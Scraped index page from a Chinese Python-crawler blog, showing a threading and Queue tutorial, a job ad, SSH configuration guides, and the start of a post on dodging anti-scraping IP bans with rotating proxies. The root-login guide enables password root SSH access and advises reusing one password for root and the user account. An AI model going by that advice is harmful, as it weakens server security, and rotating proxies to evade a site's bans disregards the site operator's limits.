class="line"></span><br><span class="line">threadLock = threading.Lock()</span><br><span class="line">threads = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新线程</span></span><br><span class="line">thread1 = myThread(<span class="number">1</span>, <span class="string">"Thread-1"</span>, <span class="number">1</span>)</span><br><span class="line">thread2 = myThread(<span class="number">2</span>, <span class="string">"Thread-2"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启新线程</span></span><br><span class="line">thread1.start()</span><br><span class="line">thread2.start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加线程到线程列表</span></span><br><span class="line">threads.append(thread1)</span><br><span class="line">threads.append(thread2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有线程完成</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="symbol">threads:</span></span><br><span class="line">    t.join()</span><br><span class="line"></span><br><span class="line">print <span class="string">"Exiting Main Thread"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在上面的代码中运用了线程锁还有join等待。 运行结果如下：</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Starting Thread<span class="number">-1</span></span><br><span class="line">Starting Thread<span class="number">-2</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">49</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">50</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-1</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">51</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">53</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">55</span> <span class="number">2016</span></span><br><span class="line">Thread<span class="number">-2</span>: Thu Nov  <span class="number">3</span> <span class="number">18</span>:<span class="number">56</span>:<span class="number">57</span> <span class="number">2016</span></span><br><span class="line">Exiting Main Thread</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>这样一来，你可以发现就不会出现刚才的输出混乱的结果了。</p>
                  <h2 id="线程优先级队列"><a href="#线程优先级队列" class="headerlink" title="线程优先级队列"></a>线程优先级队列</h2>
                  <p>Python的Queue模块中提供了同步的、线程安全的队列类，包括FIFO（先入先出)队列Queue，LIFO（后入先出）队列LifoQueue，和优先级队列PriorityQueue。这些队列都实现了锁原语，能够在多线程中直接使用。可以使用队列来实现线程间的同步。</p>
                  <p>Queue模块中的常用方法:</p>
                  <ul>
                    <li>Queue.qsize() 返回队列的大小</li>
                    <li>Queue.empty() 如果队列为空，返回True,反之False</li>
                    <li>Queue.full() 如果队列满了，返回True,反之False</li>
                    <li>Queue.full 与 maxsize 大小对应</li>
                    <li>Queue.get([block[, timeout]])获取队列，timeout等待时间</li>
                    <li>Queue.get_nowait() 相当Queue.get(False)</li>
                    <li>Queue.put(item) 写入队列，timeout等待时间</li>
                    <li>Queue.put_nowait(item) 相当Queue.put(item, False)</li>
                    <li>Queue.task_done() 在完成一项工作之后，Queue.task_done()函数向任务已经完成的队列发送一个信号</li>
                    <li>Queue.join() 实际上意味着等到队列为空，再执行别的操作</li>
                  </ul>
                  <p>用一个实例感受一下：</p>
                  <figure class="highlight routeros">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line">import Queue</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">exitFlag = 0</span><br><span class="line"></span><br><span class="line">class myThread (threading.Thread):</span><br><span class="line">    def __init__(self, threadID, name, q):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.threadID = threadID</span><br><span class="line">        self.name = name</span><br><span class="line">        self.q = q</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"Starting "</span> + self.name</span><br><span class="line">        process_data(self.name, self.q)</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"Exiting "</span> + self.name</span><br><span class="line"></span><br><span class="line">def process_data(threadName, q):</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> exitFlag:</span><br><span class="line">        queueLock.acquire()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> workQueue.empty():</span><br><span class="line">            data = q.<span class="builtin-name">get</span>()</span><br><span class="line">            queueLock.release()</span><br><span class="line">            <span class="builtin-name">print</span> <span class="string">"%s processing %s"</span> % (threadName, data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            queueLock.release()</span><br><span class="line">        time.sleep(1)</span><br><span class="line"></span><br><span class="line">threadList = [<span class="string">"Thread-1"</span>, <span class="string">"Thread-2"</span>, <span class="string">"Thread-3"</span>]</span><br><span class="line">nameList = [<span class="string">"One"</span>, <span class="string">"Two"</span>, <span class="string">"Three"</span>, <span class="string">"Four"</span>, <span class="string">"Five"</span>]</span><br><span class="line">queueLock = threading.Lock()</span><br><span class="line">workQueue = Queue.Queue(10)</span><br><span class="line">threads = []</span><br><span class="line">threadID = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建新线程</span></span><br><span class="line"><span class="keyword">for</span> tName <span class="keyword">in</span> threadList:</span><br><span class="line">    thread = myThread(threadID, tName, workQueue)</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line">    threadID += 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 填充队列</span></span><br><span class="line">queueLock.acquire()</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> nameList:</span><br><span class="line">    workQueue.put(word)</span><br><span class="line">queueLock.release()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待队列清空</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> workQueue.empty():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通知线程是时候退出</span></span><br><span class="line">exitFlag = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有线程完成</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">    t.join()</span><br><span class="line"><span class="builtin-name">print</span> <span class="string">"Exiting Main Thread"</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>运行结果：</p>
                  <figure class="highlight autohotkey">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">Starting <span class="keyword">Thread</span>-<span class="number">1</span></span><br><span class="line">Starting <span class="keyword">Thread</span>-<span class="number">2</span></span><br><span class="line">Starting <span class="keyword">Thread</span>-<span class="number">3</span></span><br><span class="line"><span class="keyword">Thread</span>-<span class="number">3</span> processing One</span><br><span class="line"><span class="keyword">Thread</span>-<span class="number">1</span> processing Two</span><br><span class="line"><span class="keyword">Thread</span>-<span class="number">2</span> processing Three</span><br><span class="line"><span class="keyword">Thread</span>-<span class="number">3</span> processing Four</span><br><span class="line"><span class="keyword">Thread</span>-<span class="number">2</span> processing Five</span><br><span class="line">Exiting <span class="keyword">Thread</span>-<span class="number">2</span></span><br><span class="line">Exiting <span class="keyword">Thread</span>-<span class="number">3</span></span><br><span class="line">Exiting <span class="keyword">Thread</span>-<span class="number">1</span></span><br><span class="line">Exiting Main <span class="keyword">Thread</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>上面的例子用了FIFO队列。当然你也可以换成其他类型的队列。</p>
                  <h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2>
                  <ol>
                    <li>
                      <p><a href="http://bbs.51cto.com/thread-1349105-1.html" target="_blank" rel="noopener">http://bbs.51cto.com/thread-1349105-1.html</a></p>
                    </li>
                    <li>
                      <p><a href="http://www.runoob.com/python/python-multithreading.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-multithreading.html</a></p>
                    </li>
                  </ol>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-03 19:34:26" itemprop="dateCreated datePublished" datetime="2016-11-03T19:34:26+08:00">2016-11-03</time>
                </span>
                <span id="/3325.html" class="post-meta-item leancloud_visitors" data-flag-title="Python爬虫进阶五之多线程的用法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>7.9k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>7 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3323.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> 职位推荐 <i class="label-arrow"></i>
                  </a>
                  <a href="/3323.html" class="post-title-link" itemprop="url">百观科技 - 爬虫数据工程师</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p>Hi，爬虫学习得还不错吧？ 做了这么久的爬虫，想不想找一份充分施展才华的工作？博主最近去参观了一下百观科技，在北京，感觉非常不错，公司人也超级好！不过博主现在还在念书，现在还不能去啦~ 在这里将职位推荐给大家，如果你对爬虫非常感兴趣，那么强烈推荐你来！待遇丰厚着呢~</p>
                  <h2 id="关于百观"><a href="#关于百观" class="headerlink" title="关于百观"></a>关于百观</h2>
                  <p>百观Lab是一个年轻开放，硅谷风格的金融数据技术公司，致力于给全球投资机构抓取、分析、可视化非常规数据的产品。我们的客户将是管理规模一亿美金以上的国际投资机构，涉及的投资决策上千万美金。百观已获得真格基金、金沙江合伙人等百万美金天使投资。 <a href="http://baiguanlab.com" target="_blank" rel="noopener">公司官网</a> <a href="https://36kr.com/p/5050764.html" target="_blank" rel="noopener">相关新闻</a></p>
                  <h2 id="公司待遇"><a href="#公司待遇" class="headerlink" title="公司待遇"></a>公司待遇</h2>
                  <p>为了做出最棒的产品，公司需要同样充满好奇心，技艺高超的小伙伴。我们提供：</p>
                  <ul>
                    <li>BAT同等级待遇</li>
                    <li>股权激励</li>
                    <li>超棒的办公环境，紧邻雍和宫五道营 # 我们也不喜欢西二旗</li>
                    <li>弹性工作制 # 我们也不相信996</li>
                    <li>有趣的同事</li>
                    <li>和百观技术顾问团交流学习的机会(百度机器学习T9, 前豌豆荚资深架构师，斯坦福AI博士等)</li>
                    <li>MacBook Pro，零食饮料，免费午餐</li>
                    <li>免费口罩，北京嘛…</li>
                  </ul>
                  <h2 id="职位"><a href="#职位" class="headerlink" title="职位"></a>职位</h2>
                  <h3 id="数据工程师"><a href="#数据工程师" class="headerlink" title="数据工程师"></a>数据工程师</h3>
                  <h4 id="职责："><a href="#职责：" class="headerlink" title="职责："></a>职责：</h4>
                  <ul>
                    <li>探索并实践前沿爬虫技术与存储技术</li>
                    <li>分布式爬虫系统的开发，维护，与优化</li>
                  </ul>
                  <h4 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h4>
                  <ul>
                    <li>热爱技术，对解决具有挑战性问题富有激情，学习能力和求知欲强</li>
                    <li>具备强悍的编码能力，内功扎实</li>
                    <li>熟悉linux开发环境，熟悉python，毕竟life is short</li>
                    <li>有过分布式爬虫开发经验，熟悉多线程、网络通信、代理池等相关概念；熟悉scrapy+redis/pyspider/mongodb者优先</li>
                    <li>可提供Github/OSChina/StackOverflow/V2EX/知乎/csdn等id的优先</li>
                    <li>一线大学计算机或相关专业</li>
                    <li>阅读英文技术文档无障碍</li>
                  </ul>
                  <h2 id="简历投递"><a href="#简历投递" class="headerlink" title="简历投递"></a>简历投递</h2>
                  <p>简历投递至 ted@baiguanlab.com 微信联系 cdfcdf789 有意向的赶快发简历加微信啦~</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-11-03 15:09:11" itemprop="dateCreated datePublished" datetime="2016-11-03T15:09:11+08:00">2016-11-03</time>
                </span>
                <span id="/3323.html" class="post-meta-item leancloud_visitors" data-flag-title="百观科技 - 爬虫数据工程师" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>749</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3296.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/3296.html" class="post-title-link" itemprop="url">腾讯云ubuntu账号更改为root登录的方法</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2>
                  <p>有需求才有动力！ 腾讯云有个比较坑的地方，Ubuntu 的机子必须要用 ubuntu 账号来登录，给我的统一管理带来了很大的麻烦。 在这里我想把它的账号名称改成 root 来统一登录。</p>
                  <h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2>
                  <p>首先用 ubuntu 账号登录主机。 然后输入</p>
                  <figure class="highlight ebnf">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="attribute">sudo passwd root</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>在这里会首先提示你输入 ubuntu 用户的账号，然后输入新设置的 root 用户的账号。在这里一共要输入三次，不过建议 root 密码和 ubuntu 密码都一样啦。 <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-1@2x-e1477899685193.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-1@2x-e1477899685193-1024x655.png" alt="QQ20161031-1@2x"></a> 然后修改 /etc/ssh/sshd_config</p>
                  <figure class="highlight awk">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo vi <span class="regexp">/etc/</span>ssh<span class="regexp">/sshd_config</span></span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>把 PermitRootLogin 修改为 yes <a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-2@2x-e1477899851747.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-2@2x-e1477899851747-1024x650.png" alt="QQ20161031-2@2x"></a> wq 保存 接下来你就可以使用 root 登录了 当然你还可以根据下面这篇文章配置免密码登录。 <a href="http://cuiqingcai.com/3291.html">免密码登录</a></p>
                  <h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>
                  <p>本文章介绍了腾讯云 Ubuntu 系列主机配置 root 登录的方法，希望对大家有帮助。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-10-31 15:46:37" itemprop="dateCreated datePublished" datetime="2016-10-31T15:46:37+08:00">2016-10-31</time>
                </span>
                <span id="/3296.html" class="post-meta-item leancloud_visitors" data-flag-title="腾讯云ubuntu账号更改为root登录的方法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>364</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3291.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Other <i class="label-arrow"></i>
                  </a>
                  <a href="/3291.html" class="post-title-link" itemprop="url">配置SSH免密码登录远程服务器</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2>
                  <p>有需求才有动力！ 最近有不少服务器，但是管理起来还需要输入密码，而且有的还不一样，太麻烦了，所以就利用 SSH 配置免密码登录服务器。</p>
                  <h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2>
                  <h3 id="生成秘钥"><a href="#生成秘钥" class="headerlink" title="生成秘钥"></a>生成秘钥</h3>
                  <p>首先在自己的电脑上生成 SSH 秘钥。</p>
                  <figure class="highlight excel">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">ssh-keygen –<span class="built_in">t</span> rsa –P</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>直接回车生成秘钥对。 可以看到在 ~/ 目录找到一个 .ssh 的目录，有两个文件。 id_rsa 和 id_rsa.pub 其中一个是私钥，一个是公钥。 服务器上利用同样的方法创建，保证有一个 .ssh 目录。</p>
                  <h3 id="复制秘钥"><a href="#复制秘钥" class="headerlink" title="复制秘钥"></a>复制秘钥</h3>
                  <p>登录服务器后，在 .ssh 目录新建一个文件，名字叫做 authorized_keys 将刚才自己电脑上生成的公钥内容复制进去，保存。 然后进行权限设置</p>
                  <figure class="highlight angelscript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">sudo chmod <span class="number">600</span> authorized_keys</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-0@2x-e1477897864553.png" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ20161031-0@2x-e1477897864553-1024x652.png" alt=""></a> 如此一来，配置就完成了。</p>
                  <h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2>
                  <p>断开服务器，重新连接 ssh，发现就可以直接进入了。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2016-10-31 15:21:46" itemprop="dateCreated datePublished" datetime="2016-10-31T15:21:46+08:00">2016-10-31</time>
                </span>
                <span id="/3291.html" class="post-meta-item leancloud_visitors" data-flag-title="配置SSH免密码登录远程服务器" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>345</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>1 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/3256.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/3256.html" class="post-title-link" itemprop="url">小白爬虫第二弹之健壮的小爬虫</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <p><a href="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" target="_blank" rel="noopener"><img src="http://cdn.cuiqingcai.com/wp-content/uploads/2016/10/QQ图片20161022193315.gif" alt="QQ图片20161022193315"></a> 我又来装逼了！上次教大家写了一个下载www.mzitu.com全站图片的小爬虫练手、不知道大家消化得怎么样？ 大家在使用的时候会发现，跑着跑着 就断掉了！报错了啊！丢失连接之类的。幸幸苦苦的抓了半天又得从头来，心累啊！ 这就是网站的反爬虫在起作用了，一个 IP 访问次数过于频繁就先将这个 IP 加入黑名单，过一会儿再放出来。虽然不影响正常使用但是对于爬虫来说很致命啊！因为爬虫会报错退出啊！然后我们又得重来，那么多妹子得重来多少次啊！（而且小爬虫不会识别哪些是爬取过的页面，哪些是没爬去的内容，会从头再来啊！很伤人啊！关于这一块儿我下一篇博文来教大家怎么办，这一篇我们还是先集中精力应付反爬虫吧！ 关于反爬虫的定义：建议大家去看看这个 blog: <a href="http://blog.csdn.net/u013886628/article/details/51820221" target="_blank" rel="noopener">点我</a> <strong>一般来说我们会遇到网站反爬虫策略下面几点：</strong></p>
                  <ol>
                    <li>限制 IP 访问频率，超过频率就断开连接。（这种方法解决办法就是，降低爬虫的速度在每个请求前面加上 time.sleep；或者不停的更换代理 IP，这样就绕过反爬虫机制啦！）</li>
                    <li>后台对访问进行统计，如果单个 userAgent 访问超过阈值，予以封锁。（效果出奇的棒！不过误伤也超级大，一般站点不会使用，不过我们也考虑进去</li>
                    <li>还有针对于 cookies 的 （这个解决办法更简单，一般网站不会用）</li>
                  </ol>
                  <p>我们今天就来针对 1、2 两点来写个下载模块、别害怕真的很简单。 首先，这次我们需要用到 Python 中的 re 模块来提取内容，很简单的用法，但是也需要各位了解一下：<a href="http://www.runoob.com/python3/python3-reg-expressions.html" target="_blank" rel="noopener">点我查看正则表达式基本教程</a> 首先照常我们需要下面这些模块： requests re（Python 的正则表达式模块） random（一个随机选择的模块） 都是上一篇文章装过的哦！re 和 random 是 Python 自带的模块，不需要安装ヾ§ ￣ ▽)ゞ 2333333 首先按照惯例我们导入模块：</p>
                  <figure class="highlight elm">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>我们的思路是先找一个发布代理 IP 的网站（百度一下很多的！）从这个网站爬取出代理 IP 用来访问网页；当本地 IP 失效时，开始使用代理 IP，代理 IP 失败六次后取消代理 IP。下面我们开整ヽ(●-`Д´-)ノ 首先我们写一个基本的请求网页并返回 response 的函数:</p>
                  <figure class="highlight haskell">
                    <table>
                      <tr>
                        <td class="gutter">
